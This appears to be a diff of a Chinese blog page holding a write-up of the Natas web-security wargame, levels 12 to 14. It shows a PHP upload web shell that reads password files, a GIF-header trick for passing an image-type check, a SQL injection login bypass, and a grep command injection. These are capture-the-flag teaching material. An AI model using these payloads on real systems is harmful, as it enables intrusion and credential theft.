@@ -141,7 +141,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    504 字
+                    670 字
                   </span>
                 
 
@@ -253,7 +253,22 @@ grep -i &amp; cat /etc/natas_webpass/natas10</code></pre><p>这样都行</p>
 </blockquote>
 <p>grep还可以用正则，所以这里</p>
 <pre><code>$key = [a-zA-Z] /etc/natas_webpass/natas11 #
-grep -i [a-zA-Z] /etc/natas_webpass/natas11 # dictionary.txt</code></pre>
+grep -i [a-zA-Z] /etc/natas_webpass/natas11 # dictionary.txt</code></pre><h2 id="natas12"><a href="#natas12" class="headerlink" title="natas12"></a>natas12</h2><p>把文件名随机了，把后缀改成jpg了</p>
+<p>内容没有检测，尝试upload的时候用bp把文件后缀改成php就可以打开，那</p>
+<pre><code class="php">&lt;?
+    passthru(&#39;cat /etc/natas_webpass/natas13&#39;);
+?&gt;</code></pre>
+<h2 id="natas13"><a href="#natas13" class="headerlink" title="natas13"></a>natas13</h2><p>通过 <code>php</code>的函数 <code>exif_imagetype()</code> 来判断文件夹类型，</p>
+<p>可以查看php的文档，这个函数通过检查文件的签名（第一个字节），从而检测文件类型。</p>
+<p>可以用<a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">GIF98a</a>来骗过</p>
+<pre><code class="php">GIF98a
+&lt;?
+    passthru(&#39;cat /etc/natas_webpass/natas14&#39;);
+?&gt;</code></pre>
+<h2 id="natas14"><a href="#natas14" class="headerlink" title="natas14"></a>natas14</h2><pre><code class="php">$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;; </code></pre>
+<p>万能sql密码<code>&quot; OR 1=1 #</code></p>
+<pre><code class="mysql">SELECT * from users where username=&quot;&quot; OR 1=1 # and password= &quot;&quot;</code></pre>
+
             </div>
             <hr>
             <div>
